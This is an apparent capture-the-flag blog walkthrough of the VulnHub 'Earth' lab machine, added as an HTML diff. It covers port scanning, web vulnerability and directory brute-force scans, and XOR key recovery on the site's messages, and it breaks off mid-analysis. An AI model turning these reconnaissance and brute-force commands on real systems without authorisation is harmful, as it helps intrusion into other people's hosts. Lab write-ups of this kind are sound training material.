@@ -1,0 +1,1405 @@
+<meta charset="UTF-8">
+<link rel="stylesheet" href="../../../index.css"/>
+<link rel="stylesheet" href="../../../highlight/styles/monokai.min.css"/>
+<script src="../../../highlight/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+
+<h1>/f0c1s/blog/sec/vulnhub/the-planets-earth</h1>
+
+<p>
+    <a href="../../../index.html">/blog</a>
+    <a href="../../index.html">Security</a>
+    <a href="../index.html">VulnHub</a>
+    <a href="../../../sec/vulnhub/the-planets-Earth/the-planets-earth.html">+ The Planets: Earth - 2021.12.05 Monday</a>
+</p>
+
+<h1 id="the-planets-earth">The Planets: Earth</h1>
+<pre class="shell"><code>fping -aAqg 192.168.56.40/24
+192.168.56.1
+192.168.56.2
+192.168.56.40
+192.168.56.67</code></pre>
+<pre class="shell"><code>export RHOST=&quot;192.168.56.67&quot;
+export LHOST=&quot;192.168.56.40&quot;
+export LPORT=&quot;443&quot;</code></pre>
+<figure>
+    <img src="1.fping.png" alt="" /><figcaption>1.fping</figcaption>
+</figure>
+<pre class="shell"><code>_n $RHOST  
+firing nmap 192.168.56.67 | tee nmap.default.txt
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-06 05:20 IST
+Nmap scan report for 192.168.56.67
+Host is up (0.00020s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT    STATE SERVICE
+22/tcp  open  ssh
+80/tcp  open  http
+443/tcp open  https
+
+
+_ntd $RHOST
+firing nmap 192.168.56.67 -p- -Pn -A -T4 --min-rate=5000 -sVC | tee nmap.tcp-ports.deep.txt
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-06 05:20 IST
+Nmap scan report for 192.168.56.67
+Host is up (0.00059s latency).
+Not shown: 65500 filtered tcp ports (no-response), 32 filtered tcp ports (host-unreach)
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.6 (protocol 2.0)
+| ssh-hostkey: 
+|   256 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 (ECDSA)
+|_  256 b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 (ED25519)
+80/tcp  open  http     Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
+|_http-title: Bad Request (400)
+|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
+443/tcp open  ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Test Page for the HTTP Server on Fedora
+| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space
+| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local
+| Not valid before: 2021-10-12T23:26:31
+|_Not valid after:  2031-10-10T23:26:31
+|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+
+</code></pre>
+<figure>
+    <img src="2.nmap.png" alt="" /><figcaption>2.nmap</figcaption>
+</figure>
+<figure>
+    <img src="3.nmap.png" alt="" /><figcaption>3.nmap</figcaption>
+</figure>
+<pre class="shell"><code>nikto -C all -host http://$RHOST
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.56.67
++ Target Hostname:    192.168.56.67
++ Target Port:        80
++ Start Time:         2021-12-06 05:20:39 (GMT5.5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Cookie csrftoken created without the httponly flag
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ 26520 requests: 0 error(s) and 6 item(s) reported on remote host
++ End Time:           2021-12-06 05:24:09 (GMT5.5) (210 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</code></pre>
+<figure>
+    <img src="4.nikto.png" alt="" /><figcaption>4.nikto</figcaption>
+</figure>
+<pre class="shell"><code>curl -s -I http://$RHOST | tee curl.-sI.txt
+HTTP/1.1 400 Bad Request
+Date: Sun, 05 Dec 2021 23:56:08 GMT
+Server: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
+X-Content-Type-Options: nosniff
+Referrer-Policy: same-origin
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+                                                                                                                   
+curl -s -I http://$RHOST/robots.txt | tee curl.-sI-robots.txt
+HTTP/1.1 400 Bad Request
+Date: Sun, 05 Dec 2021 23:56:20 GMT
+Server: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
+X-Content-Type-Options: nosniff
+Referrer-Policy: same-origin
+Connection: close
+Content-Type: text/html; charset=UTF-8</code></pre>
+<figure>
+    <img src="5.curl.png" alt="" /><figcaption>5.curl: Curl tells us if there is something that we need to look at first. This time, there wasn’t.</figcaption>
+</figure>
+<figure>
+    <img src="6.browser.png" alt="" /><figcaption>6.browser: Opening the site in browser to confirm that server is throwing bad request response.</figcaption>
+</figure>
+<p>It seems that I should update the /etc/hosts file to contain <code>earth.local</code> and then attack that URI.</p>
+<p>You can notice <code>earth.local</code> in nmap scan above.</p>
+<figure>
+    <img src="7.updated-etc-hosts.png" alt="" /><figcaption>7.updated-etc-hosts</figcaption>
+</figure>
+<figure>
+    <img src="8.browsing-earth-local.png" alt="" /><figcaption>8.browsing-earth-local: And immediately we are taken to the content.</figcaption>
+</figure>
+<div class="sourceCode" id="cb6"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true"></a><span class="dt">&lt;!doctype </span>html<span class="dt">&gt;</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true"></a><span class="kw">&lt;html</span><span class="ot"> lang=</span><span class="st">&quot;en&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true"></a><span class="kw">&lt;head&gt;</span></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true"></a>    <span class="kw">&lt;meta</span><span class="ot"> charset=</span><span class="st">&quot;utf-8&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true"></a>    <span class="kw">&lt;title&gt;</span>Earth Secure Messaging<span class="kw">&lt;/title&gt;</span></span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true"></a></span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true"></a>    <span class="kw">&lt;link</span><span class="ot"> rel=</span><span class="st">&quot;stylesheet&quot;</span><span class="ot"> href=</span><span class="st">&quot;/static/styles.css&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true"></a><span class="kw">&lt;/head&gt;</span></span>
+<span id="cb6-9"><a href="#cb6-9" aria-hidden="true"></a><span class="kw">&lt;body&gt;</span></span>
+<span id="cb6-10"><a href="#cb6-10" aria-hidden="true"></a><span class="kw">&lt;h1</span><span class="ot"> class=</span><span class="st">&quot;aligncenter&quot;</span><span class="kw">&gt;</span>Earth Secure Messaging Service<span class="kw">&lt;/h1&gt;</span></span>
+<span id="cb6-11"><a href="#cb6-11" aria-hidden="true"></a><span class="kw">&lt;div</span><span class="ot"> class=</span><span class="st">&quot;aligncenter&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb6-12"><a href="#cb6-12" aria-hidden="true"></a>    <span class="kw">&lt;img</span><span class="ot"> src=</span><span class="st">&quot;/static/earth1.jpg&quot;</span><span class="ot"> alt=</span><span class="st">&quot;Picture of Earth&quot;</span><span class="ot"> width=</span><span class="st">&quot;400&quot;</span><span class="ot"> height=</span><span class="st">&quot;400&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb6-13"><a href="#cb6-13" aria-hidden="true"></a><span class="kw">&lt;/div&gt;</span></span>
+<span id="cb6-14"><a href="#cb6-14" aria-hidden="true"></a><span class="kw">&lt;form</span><span class="ot"> action=</span><span class="st">&quot;/&quot;</span><span class="ot"> method=</span><span class="st">&quot;post&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb6-15"><a href="#cb6-15" aria-hidden="true"></a>    <span class="kw">&lt;label</span><span class="ot"> for=</span><span class="st">&quot;message&quot;</span><span class="kw">&gt;</span>Send your message to Earth:<span class="kw">&lt;/label&gt;</span></span>
+<span id="cb6-16"><a href="#cb6-16" aria-hidden="true"></a>    <span class="kw">&lt;input</span><span class="ot"> type=</span><span class="st">&quot;hidden&quot;</span><span class="ot"> name=</span><span class="st">&quot;csrfmiddlewaretoken&quot;</span></span>
+<span id="cb6-17"><a href="#cb6-17" aria-hidden="true"></a><span class="ot">           value=</span><span class="st">&quot;Nn7pNclagKVyFuLwfo5pNTXSkI8pq0u25ViPAVdIFi7aPPKoh29LcIU2NbsF8kbh&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb6-18"><a href="#cb6-18" aria-hidden="true"></a>    <span class="kw">&lt;p&gt;&lt;label</span><span class="ot"> for=</span><span class="st">&quot;id_message&quot;</span><span class="kw">&gt;</span>Message:<span class="kw">&lt;/label&gt;</span> <span class="kw">&lt;textarea</span><span class="ot"> name=</span><span class="st">&quot;message&quot;</span><span class="ot"> cols=</span><span class="st">&quot;40&quot;</span><span class="ot"> rows=</span><span class="st">&quot;10&quot;</span><span class="ot"> maxlength=</span><span class="st">&quot;500&quot;</span><span class="ot"> required</span></span>
+<span id="cb6-19"><a href="#cb6-19" aria-hidden="true"></a><span class="ot">                                                          id=</span><span class="st">&quot;id_message&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb6-20"><a href="#cb6-20" aria-hidden="true"></a><span class="kw">&lt;/textarea&gt;&lt;/p&gt;</span></span>
+<span id="cb6-21"><a href="#cb6-21" aria-hidden="true"></a>    <span class="kw">&lt;p&gt;&lt;label</span><span class="ot"> for=</span><span class="st">&quot;id_message_key&quot;</span><span class="kw">&gt;</span>Message key:<span class="kw">&lt;/label&gt;</span> <span class="kw">&lt;input</span><span class="ot"> type=</span><span class="st">&quot;text&quot;</span><span class="ot"> name=</span><span class="st">&quot;message_key&quot;</span><span class="ot"> maxlength=</span><span class="st">&quot;50&quot;</span><span class="ot"> required</span></span>
+<span id="cb6-22"><a href="#cb6-22" aria-hidden="true"></a><span class="ot">                                                               id=</span><span class="st">&quot;id_message_key&quot;</span><span class="kw">&gt;&lt;/p&gt;</span></span>
+<span id="cb6-23"><a href="#cb6-23" aria-hidden="true"></a>    <span class="kw">&lt;input</span><span class="ot"> type=</span><span class="st">&quot;submit&quot;</span><span class="ot"> value=</span><span class="st">&quot;Send message&quot;</span><span class="kw">&gt;</span></span>
+<span id="cb6-24"><a href="#cb6-24" aria-hidden="true"></a><span class="kw">&lt;/form&gt;</span></span>
+<span id="cb6-25"><a href="#cb6-25" aria-hidden="true"></a>Previous Messages:</span>
+<span id="cb6-26"><a href="#cb6-26" aria-hidden="true"></a><span class="kw">&lt;ul&gt;</span></span>
+<span id="cb6-27"><a href="#cb6-27" aria-hidden="true"></a></span>
+<span id="cb6-28"><a href="#cb6-28" aria-hidden="true"></a>    <span class="kw">&lt;li&gt;</span></span>
+<span id="cb6-29"><a href="#cb6-29" aria-hidden="true"></a>        37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40</span>
+<span id="cb6-30"><a href="#cb6-30" aria-hidden="true"></a>    <span class="kw">&lt;/li&gt;</span></span>
+<span id="cb6-31"><a href="#cb6-31" aria-hidden="true"></a></span>
+<span id="cb6-32"><a href="#cb6-32" aria-hidden="true"></a>    <span class="kw">&lt;li&gt;</span></span>
+<span id="cb6-33"><a href="#cb6-33" aria-hidden="true"></a>        3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45</span>
+<span id="cb6-34"><a href="#cb6-34" aria-hidden="true"></a>    <span class="kw">&lt;/li&gt;</span></span>
+<span id="cb6-35"><a href="#cb6-35" aria-hidden="true"></a></span>
+<span id="cb6-36"><a href="#cb6-36" aria-hidden="true"></a>    <span class="kw">&lt;li&gt;</span></span>
+<span id="cb6-37"><a href="#cb6-37" aria-hidden="true"></a>        2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a</span>
+<span id="cb6-38"><a href="#cb6-38" aria-hidden="true"></a>    <span class="kw">&lt;/li&gt;</span></span>
+<span id="cb6-39"><a href="#cb6-39" aria-hidden="true"></a></span>
+<span id="cb6-40"><a href="#cb6-40" aria-hidden="true"></a><span class="kw">&lt;/ul&gt;</span></span>
+<span id="cb6-41"><a href="#cb6-41" aria-hidden="true"></a><span class="kw">&lt;/body&gt;</span></span>
+<span id="cb6-42"><a href="#cb6-42" aria-hidden="true"></a><span class="kw">&lt;/html&gt;</span></span></code></pre></div>
+<p>While browsing for the source code, notice:</p>
+<ul>
+    <li>The strings are of different length.</li>
+    <li>All of the strings are only hexadecimal encoded.</li>
+    <li>There is an image and a directory. We can try to extract information from the image or other images.</li>
+    <li>Now that we have site working, may be we should “browse” it first.</li>
+</ul>
+<pre class="shell"><code>nikto -C all -host http://earth.local
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.56.67
++ Target Hostname:    earth.local
++ Target Port:        80
++ Start Time:         2021-12-06 05:41:11 (GMT5.5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Cookie csrftoken created without the httponly flag
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ OSVDB-3092: /admin/: This might be interesting...
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ 26391 requests: 0 error(s) and 6 item(s) reported on remote host
++ End Time:           2021-12-06 05:42:31 (GMT5.5) (80 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested</code></pre>
+<figure>
+    <img src="9.nikto.png" alt="" /><figcaption>9.nikto: again, this time it does show us that /admin is present. A small victory!</figcaption>
+</figure>
+<pre class="shell"><code>curl -s -I http://earth.local 
+HTTP/1.1 200 OK
+Date: Mon, 06 Dec 2021 00:14:37 GMT
+Server: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
+Content-Length: 2595
+X-Frame-Options: DENY
+Vary: Cookie
+X-Content-Type-Options: nosniff
+Referrer-Policy: same-origin
+Set-Cookie: csrftoken=vONm5LoPqEOD3jWWpYvwth833HkdkZIPwAfBjTC9gEe0YBjsV5UalHeoUuPUolFT; expires=Mon, 05 Dec 2022 00:14:37 GMT; Max-Age=31449600; Path=/; SameSite=Lax
+Content-Type: text/html; charset=utf-8
+
+
+curl -s -I http://earth.local/robots.txt
+HTTP/1.1 404 Not Found
+Date: Mon, 06 Dec 2021 00:14:41 GMT
+Server: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
+Content-Length: 179
+X-Frame-Options: DENY
+X-Content-Type-Options: nosniff
+Referrer-Policy: same-origin
+Content-Type: text/html; charset=UTF-8
+</code></pre>
+<figure>
+    <img src="10.curl.png" alt="" /><figcaption>10.curl</figcaption>
+</figure>
+<p>robots.txt is not found. :(</p>
+<pre class="shell"><code>curl -s  http://earth.local | html2text | grep -v &quot;^$&quot; | tee curl.earth-local.txt
+****** Earth Secure Messaging Service ******
+[Picture of Earth]
+Send your message to Earth:
+Message key: [message_key         ]
+[Send message]
+Previous Messages:
+    * 37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40
+    * 3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45
+    * 2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a</code></pre>
+<figure>
+    <img src="11.curl-html2text.png" alt="" /><figcaption>11.curl-html2text: a much better way to browse a site for secrets really</figcaption>
+</figure>
+<pre class="shell"><code>curl -s http://earth.local -A &quot;Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)&quot; | sed -n &#39;s/.*src=&quot;\([^&quot;]*\).*/\1/p&#39; | sort | uniq | tee curl.src.txt
+/static/earth1.jpg
+
+curl -s http://earth.local -A &quot;Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)&quot; | sed -n &#39;s/.*href=&quot;\([^&quot;]*\).*/\1/p&#39; | sort | uniq | tee curl.href.txt
+/static/styles.css
+</code></pre>
+<figure>
+    <img src="12.curl-src-html.png" alt="" /><figcaption>12.curl-src-html: Finding the links from here</figcaption>
+</figure>
+<pre class="shell"><code>feroxbuster -q -u http://earth.local -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --rate-limit 100 -d 2 -L 4
+301        0l        0w        0c http://earth.local/admin
+200       18l       50w      746c http://earth.local/admin/login
+302        0l        0w        0c http://earth.local/admin/logout
+Scanning: http://earth.local
+Scanning: http://earth.local/admin
+^C </code></pre>
+<figure>
+    <img src="13.feroxbuster.png" alt="" /><figcaption>13.feroxbuster: The browsing part…</figcaption>
+</figure>
+<pre class="shell"><code>gobuster dir --url http://earth.local --wordlist /usr/share/wordlists/rockyou.txt -x txt,php,bak -q
+/admin                (Status: 301) [Size: 0] [--&gt; /admin/]
+/??????.txt           (Status: 200) [Size: 2595]           
+/??????.php           (Status: 200) [Size: 2595]           
+/??????.bak           (Status: 200) [Size: 2595]           
+/??????               (Status: 200) [Size: 2595]           
+///////               (Status: 200) [Size: 2595]           
+^C
+[!] Keyboard interrupt detected, terminating.</code></pre>
+<figure>
+    <img src="14.gobuster.png" alt="" /><figcaption>14.gobuster</figcaption>
+</figure>
+<pre class="shell"><code>f0c1s@kali:~/vuln-hubs/the-planets/Earth $
+curl -s  http://earth.local/admin | html2text | grep -v &quot;^$&quot; | tee curl.earth-local.admin.txt
+                                                                                                                   
+</code></pre>
+<figure>
+    <img src="15.curl-admin.png" alt="" /><figcaption>15.curl-admin</figcaption>
+</figure>
+<blockquote>
+    <p>http://earth.local/admin/</p>
+</blockquote>
+<figure>
+    <img src="16.admin.png" alt="" /><figcaption>16.admin: we are not logged in</figcaption>
+</figure>
+<p>The url ends with <code>/</code>, we need to update the curl command above.</p>
+<pre class="shell"><code>curl -s  http://earth.local/admin/ | html2text | grep -v &quot;^$&quot; | tee curl.earth-local.admin.txt
+****** Admin Command Tool ******
+You are not logged in. Please: Log_In
+</code></pre>
+<figure>
+    <img src="17.rectified-curl.png" alt="" /><figcaption>17.rectified-curl: we cannot have issues hanging like that</figcaption>
+</figure>
+<blockquote>
+    <p>Taking a look at secure message generation on the landing page</p>
+</blockquote>
+<figure>
+    <img src="18.sample-secure-message-generation.png" alt="" /><figcaption>18.sample-secure-message-generation</figcaption>
+</figure>
+<div class="line-block">Message | Key | Generated output | | - | - | - | | a | a | 00 | | b | a | 03 | | c | a | 02 | | d | a | 05 | | e | a |</div>
+<p>04 | | f | a | 07 | | g | a | 06 | | abcdefg | a | 00030205040706 | | abcdefg | b | 03000106070405 | | abcdefg | c | 02010007060504 | | abcdefg | d | 05060700010203 | | abcdefg | e | 04070601000302 | | abcdefg | f | 07040502030001 | | abcdefg | g | 06050403020100 | | abcdefg | abcdefg | 00000000000000 |</p>
+<figure>
+    <img src="19.more-manual-testing.png" alt="" /><figcaption>19.more-manual-testing</figcaption>
+</figure>
+<p>And it seems that we are dealing with XOR and hexadecimals.</p>
+<div class="line-block">Message | Key | Generated output | | - | - | - | | ABC | abc| 202020 | | ABC | 123| 707070 | | 123 | ABC | 707070 | |</div>
+<p>abc | ABC | 202020 |</p>
+<ul>
+    <li>And it doesn’t matter if key and message are interchanged, the output would be the same.</li>
+    <li>The decimal XOR of A and a is 32, in hex it is 20.</li>
+</ul>
+<figure>
+    <img src="20.key-message-can-be-interchanged.png" alt="" /><figcaption>20.key-message-can-be-interchanged</figcaption>
+</figure>
+<div class="sourceCode" id="cb15"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true"></a><span class="kw">var</span> dataset <span class="op">=</span> <span class="st">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+/ 1234567890&quot;</span></span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true"></a><span class="kw">var</span> splat <span class="op">=</span> dataset<span class="op">.</span><span class="fu">split</span>(<span class="st">&#39;&#39;</span>)<span class="op">.</span><span class="fu">map</span>(c <span class="kw">=&gt;</span> c<span class="op">.</span><span class="fu">charCodeAt</span>(<span class="dv">0</span>))</span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true"></a></span>
+<span id="cb15-4"><a href="#cb15-4" aria-hidden="true"></a><span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(splat<span class="op">.</span><span class="fu">map</span>(s <span class="kw">=&gt;</span> splat<span class="op">.</span><span class="fu">map</span>(c <span class="kw">=&gt;</span> c <span class="op">^</span> s)<span class="op">.</span><span class="fu">map</span>(i <span class="kw">=&gt;</span> i<span class="op">.</span><span class="fu">toString</span>(<span class="dv">16</span>)<span class="op">.</span><span class="fu">padStart</span>(<span class="dv">2</span><span class="op">,</span> <span class="st">&#39;0&#39;</span>))))</span></code></pre></div>
+<figure>
+    <img src="21-output-of-whatever-this-is.png" alt="" /><figcaption>21-output-of-whatever-this-is</figcaption>
+</figure>
+<p>Welp, this seems futile.</p>
+<blockquote>
+    <p>https://www.dcode.fr/xor-cipher</p>
+</blockquote>
+<figure>
+    <img src="22.dcode-fr.png" alt="" /><figcaption>22.dcode-fr</figcaption>
+</figure>
+<pre><code>6475636b796475636b796475636b79  
+Saturn is the only planet in our solar system that is less dense than water. It could float in a bathtub if anybody could build a bathtub big enough.</code></pre>
+<p>For message: <code>3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45</code></p>
+<figure>
+    <img src="23.dcode-fr-settings.png" alt="" /><figcaption>23.dcode-fr-settings</figcaption>
+</figure>
+<figure>
+    <img src="24.up-close.png" alt="" /><figcaption>24.up-close</figcaption>
+</figure>
+<p>We know the message, the key is not clear.</p>
+<div class="sourceCode" id="cb17"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true"></a><span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(splat</span>
+<span id="cb17-2"><a href="#cb17-2" aria-hidden="true"></a>    <span class="op">.</span><span class="fu">map</span>(s <span class="kw">=&gt;</span> splat</span>
+<span id="cb17-3"><a href="#cb17-3" aria-hidden="true"></a>        <span class="op">.</span><span class="fu">map</span>(c <span class="kw">=&gt;</span> c <span class="op">^</span> s)</span>
+<span id="cb17-4"><a href="#cb17-4" aria-hidden="true"></a>        <span class="op">.</span><span class="fu">map</span>(i <span class="kw">=&gt;</span> <span class="vs">`</span><span class="sc">${</span>i<span class="op">.</span><span class="fu">toString</span>(<span class="dv">16</span>)<span class="op">.</span><span class="fu">padStart</span>(<span class="dv">2</span><span class="op">,</span> <span class="st">&#39;0&#39;</span>)<span class="sc">}</span><span class="vs">-</span><span class="sc">${</span><span class="bu">String</span><span class="op">.</span><span class="fu">fromCharCode</span>(i)<span class="sc">}</span><span class="vs">`</span>)<span class="op">.</span><span class="fu">join</span>(<span class="st">&#39; &#39;</span>)</span>
+<span id="cb17-5"><a href="#cb17-5" aria-hidden="true"></a>    ))</span></code></pre></div>
+<figure>
+    <img src="25.where-is-S-37.png" alt="" /><figcaption>25.where-is-S-37: Look at 44: 37-S, it comes out to be a d</figcaption>
+</figure>
+<p>Similarly, we need to figure out where is “a” 14, we can also look at 09.</p>
+<figure>
+    <img src="26.it-should-become-clear-soon.png" alt="" /><figcaption>26.it-should-become-clear-soon</figcaption>
+</figure>
+<p>21st character in our dataset.</p>
+<figure>
+    <img src="27.and-it-is-u.png" alt="" /><figcaption>27.and-it-is-u: for a to be encoded 14, the key has to have an u</figcaption>
+</figure>
+<figure>
+    <img src="28.and-it-is-h.png" alt="" /><figcaption>28.and-it-is-h: for a to be encoded 09, the key has to have an h</figcaption>
+</figure>
+<p>Rest of the strings do not reveal anything. I need to find the key and then maybe use that key against text to generate the desired encoded message.</p>
+<div class="sourceCode" id="cb18"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true"></a><span class="st">&quot;3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45&quot;</span></span>
+<span id="cb18-2"><a href="#cb18-2" aria-hidden="true"></a>    <span class="op">.</span><span class="fu">match</span>(<span class="ss">/</span><span class="sc">(</span><span class="ss">..</span><span class="sc">?)</span><span class="ss">/g</span>)</span>
+<span id="cb18-3"><a href="#cb18-3" aria-hidden="true"></a></span>
+<span id="cb18-4"><a href="#cb18-4" aria-hidden="true"></a><span class="st">&quot;3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45&quot;</span></span>
+<span id="cb18-5"><a href="#cb18-5" aria-hidden="true"></a>    <span class="op">.</span><span class="fu">match</span>(<span class="ss">/</span><span class="sc">(</span><span class="ss">..</span><span class="sc">?)</span><span class="ss">/g</span>)</span>
+<span id="cb18-6"><a href="#cb18-6" aria-hidden="true"></a>    <span class="op">.</span><span class="fu">map</span>(i <span class="kw">=&gt;</span> <span class="pp">parseInt</span>(i<span class="op">,</span> <span class="dv">16</span>) <span class="op">^</span> <span class="st">&quot;S&quot;</span><span class="op">.</span><span class="fu">charCodeAt</span>(<span class="dv">0</span>))</span></code></pre></div>
+<figure>
